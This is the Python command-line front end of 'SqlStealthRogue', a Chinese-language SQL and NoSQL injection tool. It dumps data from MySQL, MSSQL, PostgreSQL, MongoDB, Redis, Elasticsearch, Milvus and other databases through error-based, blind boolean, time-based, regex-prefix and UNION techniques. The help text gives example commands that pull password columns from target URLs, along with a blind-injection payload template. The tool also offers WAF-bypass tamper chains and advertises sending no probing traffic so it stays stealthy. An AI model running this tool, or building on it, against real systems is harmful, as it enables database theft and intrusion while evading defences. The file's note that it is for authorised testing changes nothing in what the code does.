#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SqlStealthRogue CLI — 极简注入 dump: --dbms × --technique 指定即用, 零协商流量。

不做任何环境探测(无指纹/版本/枚举/技术轮询); 所有请求均为数据提取请求。
仅限已授权的安全测试使用。库覆盖与验证状态见 --list 与各 dbms/ 模块说明。
"""

import argparse
import re
import sys
import time

from . import core, dbms
from .core import (STATS, Sender, blind_scalar, err_scalar, prefix_scalar,
                   run_rows, time_scalar, union_dump)

TECHNIQUES = ['error', 'bool', 'time', 'prefix', 'union']

EXAMPLES = r"""示例:
MySQL 报错(默认, 行迭代自动包裹):
  python SqlStealthRogue.py -u "http://t/vuln.php?id=1*" -q "SELECT password FROM users"

MSSQL 报错 / PostgreSQL 时间盲注:
  python SqlStealthRogue.py --dbms mssql -u "..." -q "SELECT name FROM master..sysdatabases"
  python SqlStealthRogue.py --dbms postgres --technique time --sec 5 -u "..." -q "SELECT secret FROM t"

MongoDB 正则前缀(表单运算符注入, 典型 PHP 风格 password[$regex]):
  python SqlStealthRogue.py --dbms mongodb --technique prefix --true-mark "登录成功" ^
    -u "http://t/login" --data "password[$regex]=*" -q password

MongoDB $where 布尔/时间(注入点须落在查询顶层):
  python SqlStealthRogue.py --dbms mongodb --technique bool --true-mark "..." ^
    -u "http://t/login" --data '{"$where":"*"}' --raw -q password

Redis (经 HTTP 应用拼接 Redis 命令, 建议配 --raw):
  python SqlStealthRogue.py --dbms redis --technique union --raw -u "..." ^
    --data "key=*" -q secretkey --regex "'([^']*)'"

Elasticsearch painless (注入点在 script/source 参数值):
  python SqlStealthRogue.py --dbms elasticsearch --technique union -u "..." ^
    --data '{"script_fields":{"l":{"script":{"source":"*"}}}}' --raw -q secret --regex '"l":\s*\["?([^"\]]+)'

Milvus 表达式(注入点在 expr 参数值, 一次全量拉取):
  python SqlStealthRogue.py --dbms milvus --technique union -u "..." --data "expr=*" ^
    -q x --regex '"secret":\s*"([^"]*)"'

国产库(已真机验证): --dbms opengauss / oceanbase (见 --list)
布尔盲注字符串型闭合: -B "' AND ascii(substr(({Q}),{P},1))>{K}#"
"""


def parse_args(argv=None):
    p = argparse.ArgumentParser(
        prog='SqlStealthRogue',
        description='极简注入 dump 工具 v3 — SQL/NoSQL/国产/向量库, 插件化 dbms, 零协商流量',
        epilog=EXAMPLES,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument('-u', '--url',
                   help='目标 URL, 用 * 标记注入点 (--list 时可省略)')
    p.add_argument('--data', help='POST body, 同样用 * 标记注入点')
    p.add_argument('-H', '--header', action='append', default=[],
                   help='附加请求头, 可重复, 如 -H "Cookie: a=b"')
    p.add_argument('--method', help='HTTP 方法, 默认 GET (有 --data 时为 POST)')
    p.add_argument('--dbms', default='mysql', choices=sorted(dbms.PROFILES),
                   help='目标数据库插件 (默认 mysql, 全列表见 --list)')
    p.add_argument('--technique', choices=TECHNIQUES,
                   help='注入方式; 缺省推断: -U/--findall=union, --true-mark=bool, 其余=error')
    p.add_argument('--list', action='store_true', dest='list_dbms',
                   help='列出全部 dbms 插件与可用技术后退出')
    p.add_argument('--list-tampers', action='store_true', dest='list_tampers',
                   help='列出全部绕 WAF tamper 插件后退出')
    p.add_argument('--tamper',
                   help='绕 WAF tamper 链, 逗号分隔按序应用, 如 "randomcase,between,space2comment"; '
                        '输出原样发送(链尾保证 wire-safe, 如 charencode); 不加则完全关闭')
    p.add_argument('--tamper-dir',
                   help='自定义 tamper 目录: 每个 *.py 含 tamper() 函数(兼容 sqlmap 风格脚本), 同名覆盖内置')
    p.add_argument('-q', '--query',
                   help='SQL: 内部查询(单列); NoSQL: 目标字段名({F}); 含 {R} 手动行迭代')

    g = p.add_argument_group('模板覆盖 (默认取自 --dbms 插件)')
    g.add_argument('-A', '--err-tpl', help='覆盖报错模式载荷模板')
    g.add_argument('--regex', help='覆盖报错/UNION 取值正则 (恰好 1 个捕获组)')
    g.add_argument('--chunk', type=int, help='覆盖报错模式每请求字符数')
    g.add_argument('-B', '--bool-tpl', help='覆盖布尔盲注载荷模板')
    g.add_argument('--bit-tpl', help='覆盖位并行探测模板(「char(P)&{M}>0」语义, 快速 bool 引擎)')
    g.add_argument('--time-tpl', help='覆盖时间盲注载荷模板')
    g.add_argument('--prefix-tpl', help='覆盖前缀模式载荷模板')
    g.add_argument('--true-mark', help='布尔/前缀模式真值特征正则')
    g.add_argument('--err-mark',
                   help='后端错误页特征正则: 命中的响应视为无效探针(重试后仍错则终止), '
                        '防止错误页被静默当作假值污染数据')
    g.add_argument('-U', '--union-tpl', help='覆盖 UNION 载荷模板')
    g.add_argument('--findall', action='store_true', help='等价于 --technique union')
    g.add_argument('--sec', type=int, default=5,
                   help='时间盲注延时秒 (默认 5; 判真阈值 = 3/4 秒数, 留 1/4 容解析抖动)')

    o = p.add_argument_group('参数')
    o.add_argument('--single', action='store_true', help='只取单值, 不做行迭代')
    o.add_argument('--max-rows', type=int, default=10000, help='最大行数 (默认 10000)')
    o.add_argument('--maxlen', type=int, default=512, help='单值最大长度 (默认 512)')
    o.add_argument('--threads', type=int, default=4, help='并发行数 (默认 4)')
    o.add_argument('--bwidth', type=int, default=16,
                   help='值内探测并发上限/HTTP 带宽 (默认 16; bool 快引擎 8 个/字符)')
    o.add_argument('--no-fast', action='store_true',
                   help='关闭快引擎(bool 位并行 / error 分块预取), 回退串行二分')
    o.add_argument('--no-keepalive', action='store_true',
                   help='禁用 keep-alive 长连接, 回退每请求新建连接(urllib)')
    o.add_argument('--timeout', type=float, default=10.0, help='请求超时秒 (默认 10)')
    o.add_argument('--delay', type=float, default=0.0, help='每请求间隔秒 (默认 0)')
    o.add_argument('--raw', action='store_true', help='载荷不做 URL 编码')
    o.add_argument('-v', '--verbose', action='store_true', help='打印每次发出的载荷')
    o.add_argument('-o', '--out', help='结果写入文件 (每行一值)')
    return p.parse_args(argv)


def available_techniques(prof):
    t = []
    if prof.get('err_tpl'):
        t.append('error')
    if prof.get('bool_tpl'):
        t.append('bool')
    if prof.get('time_tpl'):
        t.append('time')
    if prof.get('prefix_tpl'):
        t.append('prefix')
    t.append('union')
    return t


def list_dbms():
    print('%-14s %-26s %s' % ('dbms', 'techniques', 'note'))
    print('-' * 100)
    for name in sorted(dbms.PROFILES):
        prof = dbms.get(name)
        print('%-14s %-26s %s'
              % (name, ' '.join(available_techniques(prof)), prof.get('note', '')))
    print('\nunion 一律可用(-U 定制; milvus/redis/es 有内置默认模板, 仍需 --regex)')


def list_tampers():
    from . import tampers as T
    print('%-28s %s' % ('tamper', 'description'))
    print('-' * 100)
    for name in sorted(T.TAMPERS):
        print('%-28s %s' % (name, T.TAMPERS[name]['desc']))
    print('\n用法: --tamper "randomcase,between,space2comment" (按序应用; 自定义脚本放 --tamper-dir)')


def resolve(a):
    prof = dbms.get(a.dbms)
    a.db = prof
    if a.technique is None:
        a.technique = ('union' if (a.union_tpl or a.findall)
                       else 'bool' if a.true_mark else 'error')
    if a.technique == 'error' and prof.get('err_tpl') is None and not a.err_tpl:
        sys.exit('[-] %s 无报错模板, 可用技术: %s'
                 % (a.dbms, ' '.join(available_techniques(prof))))
    a.err_tpl = a.err_tpl or prof.get('err_tpl')
    a.bool_tpl = a.bool_tpl or prof.get('bool_tpl')
    a.bit_tpl = a.bit_tpl or prof.get('bit_tpl')
    a.time_tpl = a.time_tpl or prof.get('time_tpl')
    a.prefix_tpl = a.prefix_tpl or prof.get('prefix_tpl')
    a.union_tpl = a.union_tpl or prof.get('union_tpl')
    a.regex = a.regex or prof.get('err_regex')
    a.chunk = a.chunk or prof.get('err_chunk') or 30
    a.err_strip = prof.get('err_strip', 0)
    if a.regex:
        try:
            a.rx = re.compile(a.regex)
        except re.error as e:
            sys.exit('[-] --regex 无效: %s' % e)
    if a.true_mark:
        try:
            a.trx = re.compile(a.true_mark)
        except re.error as e:
            sys.exit('[-] --true-mark 无效: %s' % e)
    a.err_page_rx = None
    if a.err_mark:
        try:
            a.err_page_rx = re.compile(a.err_mark)
        except re.error as e:
            sys.exit('[-] --err-mark 无效: %s' % e)
    if a.tamper_dir:
        from . import tampers as T
        T.load_dir(a.tamper_dir)
    a.tamper_chain = None
    if a.tamper:
        from . import tampers as T
        names = [n.strip() for n in a.tamper.split(',') if n.strip()]
        try:
            a.tamper_chain = T.get_chain(names)
        except KeyError as e:
            sys.exit('[-] 未知 tamper: %s; 可用: %s'
                     % (e, ', '.join(sorted(T.TAMPERS))))


def validate(a):
    if a.url.count('*') + (a.data or '').count('*') != 1:
        sys.exit('[-] --url/--data 合计需恰好一个 * 标记注入点')
    if a.technique == 'union':
        if not a.union_tpl:
            sys.exit('[-] UNION 模式需 -U 指定载荷 (SELECT 列数/页面结构相关)')
        if not a.regex or a.rx.groups != 1:
            sys.exit('[-] UNION 模式需恰好 1 个捕获组的 --regex')
    if a.technique == 'bool' and not a.true_mark:
        sys.exit('[-] 布尔模式需 --true-mark 指定真值特征正则')
    if a.technique == 'prefix':
        if not a.true_mark:
            sys.exit('[-] 前缀模式需 --true-mark 指定匹配成功特征正则')
        if not a.prefix_tpl:
            sys.exit('[-] %s 无 prefix 模板' % a.dbms)
    if a.technique in ('error', 'bool', 'time') and not a.query:
        sys.exit('[-] 该技术需 -q 指定内部查询')
    if a.technique == 'error' and a.rx.groups != 1:
        sys.exit('[-] --regex 需要恰好 1 个捕获组')


def main(argv=None):
    for st in (sys.stdout, sys.stderr):
        try:
            st.reconfigure(encoding='utf-8', errors='replace')
        except Exception:
            pass
    a = parse_args(argv)
    if a.list_dbms:
        list_dbms()
        return
    if a.list_tampers:
        list_tampers()
        return
    if not a.url:
        parse_args(['--help'])
    resolve(a)
    validate(a)

    s = Sender(a)
    t0 = time.time()
    engine = ''
    try:
        core.init_pool(a.bwidth)
        if a.technique == 'union':
            vals = union_dump(s, a.query, a)
        elif a.technique == 'prefix':
            v = prefix_scalar(s, a)
            vals = [v] if v is not None else []
        elif a.technique == 'bool':
            if a.bit_tpl and not a.no_fast:
                engine = '+bit并行'
                vals = run_rows(a, lambda q: core.fast_bool_scalar(s, q, a))
            else:
                vals = run_rows(a, lambda q: blind_scalar(s, q, a))
        elif a.technique == 'time':
            vals = run_rows(a, lambda q: time_scalar(s, q, a))
        else:
            if not a.no_fast:
                engine = '+分块预取'
                vals = run_rows(a, lambda q: core.fast_err_scalar(s, q, a))
            else:
                vals = run_rows(a, lambda q: err_scalar(s, q, a))
    except KeyboardInterrupt:
        core.shutdown_pool()
        sys.exit('\n[!] 用户中断')
    except Exception as e:
        core.shutdown_pool()
        sys.exit('[-] %s: %s' % (type(e).__name__, e))
    finally:
        core.shutdown_pool()
    dt = time.time() - t0

    for v in vals:
        print(v)
    if a.out:
        with open(a.out, 'w', encoding='utf-8') as f:
            f.write('\n'.join(vals) + ('\n' if vals else ''))
    if not vals:
        print('[!] 未取到任何行: 检查注入点/模板/正则/true-mark/dbms 是否匹配', file=sys.stderr)
    rps = STATS['req'] / dt if dt else 0
    print('[*] %s/%s%s | %d 行 | %d 个请求 | %.2fs | %.1f req/s (提取外零探测)'
          % (a.dbms, a.technique, engine, len(vals), STATS['req'], dt, rps), file=sys.stderr)


if __name__ == '__main__':
    main()
